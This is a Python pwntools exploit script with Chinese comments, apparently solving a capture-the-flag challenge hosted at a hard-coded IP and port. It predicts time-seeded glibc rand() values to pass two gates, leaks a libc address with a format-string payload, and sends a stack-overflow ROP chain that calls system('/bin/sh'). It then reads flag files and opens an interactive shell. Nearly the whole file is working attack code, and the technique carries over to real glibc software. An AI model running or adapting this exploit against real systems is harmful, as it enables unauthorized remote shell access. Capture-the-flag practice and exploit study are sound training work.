#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
[ ]的游戏  exp  (pwntools)
漏洞链：
  1) gate_rand / guess_rand: srand(time(NULL)); rand() —— 用本地 glibc rand 预测
  2) echo_line: snprintf(buf, 0x30, 用户输入) —— 格式化字符串，泄漏 libc
  3) get_name: read(0, rbp-0x40, 0x70) —— 栈溢出，ROP => system("/bin/sh")
"""
import re
import sys
import time
import queue
import threading

from pwn import *

sys.path.insert(0, '.')
from rand_glibc import GlibcRand

context.log_level = 'info'
context.arch = 'amd64'

HOST, PORT = '103.163.47.230', 35118

# ---- libc 偏移（libc6_2.39-0ubuntu8.8_amd64.so）----
OFF_MAIN_RET = 0x2a1ca      # main 的返回地址：__libc_start_call_main 里 call rax 之后
OFF_SYSTEM   = 0x58750
OFF_BINSH    = 0x1cb42f
OFF_POP_RDI  = 0x10c08d     # pop rdi; ret

# ---- 门控提示 ----
P_ECHO   = '说出你想要说的话吧'.encode()
P_GUESS  = '做你想要做的事吧'.encode()
P_OK1    = '把 1.92%'.encode()

SKEW_MAX = 7


def gate_stream(skew, holder):
    """一个候选连接：按 skew 猜 seed，成功则把 tube 放进 holder"""
    try:
        io = remote(HOST, PORT, timeout=6)
        try:
            for _ in range(3):
                io.recv(256, timeout=2)
        except EOFError:
            pass
        seed = int(time.time()) + skew
        io.send(str(GlibcRand(seed).next()).encode() + b'\n')
        data = io.recvuntil(P_ECHO, timeout=2.0)
        if P_ECHO in data:
            holder.put((io, skew))
        else:
            io.close()
    except Exception:
        pass


def open_gate(rounds=6):
    """并发竞猜秒，返回 (io, 命中的 skew)"""
    for r in range(rounds):
        holder = queue.Queue()
        ts = [threading.Thread(target=gate_stream, args=(d, holder)) for d in range(SKEW_MAX)]
        [t.start() for t in ts]
        [t.join() for t in ts]
        if not holder.empty():
            io, sk = holder.get()
            while not holder.empty():          # 关掉多余的
                try: holder.get()[0].close()
                except Exception: pass
            log.success('gate1 通过，skew=%d (第 %d 轮)' % (sk, r + 1))
            return io, sk
        log.warning('gate1 第 %d 轮未命中，重试' % (r + 1))
    return None, None


def leak_libc(io):
    """echo_line 格式化字符串泄漏 main 的返回地址"""
    io.send(b'%17$p')
    time.sleep(0.3)
    data = b''
    try:
        while True:
            chunk = io.recv(4096, timeout=1.2)
            if not chunk:
                break
            data += chunk
    except EOFError:
        pass
    m = re.search(rb'0x[0-9a-f]{6,}', data)
    if not m:
        return None, data
    return int(m.group(), 16), data


def pass_gate2(io, skew):
    """第二个 srand(time(NULL))，seed 与 gate1 同一套路"""
    seed = int(time.time()) + skew
    ans = str(GlibcRand(seed).next()).encode()
    io.send(ans + b'\n')
    try:
        data = io.recvuntil(P_GUESS, timeout=3)
        return P_GUESS in data
    except EOFError:
        return False


def run_once():
    io, sk = open_gate()
    if io is None:
        return False

    leak, raw = leak_libc(io)
    if leak is None:
        log.failure('泄漏失败: %r' % raw[:80])
        io.close()
        return False

    if (leak & 0xfff) != (OFF_MAIN_RET & 0xfff):
        log.failure('泄漏值低位不匹配: %#x' % leak)
        io.close()
        return False

    libc = leak - OFF_MAIN_RET
    if libc & 0xfff:
        log.failure('libc 基址未对齐: %#x' % libc)
        io.close()
        return False

    log.success('libc = %#x' % libc)

    if not pass_gate2(io, sk):
        log.failure('gate2 失败')
        io.close()
        return False
    log.success('gate2 通过')

    system = libc + OFF_SYSTEM
    binsh  = libc + OFF_BINSH
    pop_rdi= libc + OFF_POP_RDI
    ret    = pop_rdi + 1          # 随便一个 ret 做栈对齐

    payload  = b'A' * 0x40
    payload += p64(0)             # saved rbp
    payload += p64(ret)           # 对齐
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(system)

    io.send(payload)
    time.sleep(0.4)

    io.sendline(b'echo PWNED; id; cat /flag* 2>/dev/null; cat /home/*/flag* 2>/dev/null')
    time.sleep(1.0)
    try:
        out = io.recvrepeat(2.0)
    except EOFError:
        out = b''
    txt = out.decode('utf-8', 'replace')
    log.info('输出:\n' + txt[:800])

    if re.search(r'HTUCTF\{[^}]+\}', txt):
        m = re.search(r'HTUCTF\{[^}]+\}', txt)
        log.success('FLAG: ' + m.group())
        io.close()
        return True

    if 'PWNED' in txt:
        log.success('拿到 shell，进入交互')
        io.interactive()
        return True

    io.close()
    return False


if __name__ == '__main__':
    for i in range(8):
        log.info('===== 第 %d 次尝试 =====' % (i + 1))
        try:
            if run_once():
                break
        except Exception as e:
            log.failure('异常: %r' % (e,))
        time.sleep(0.3)
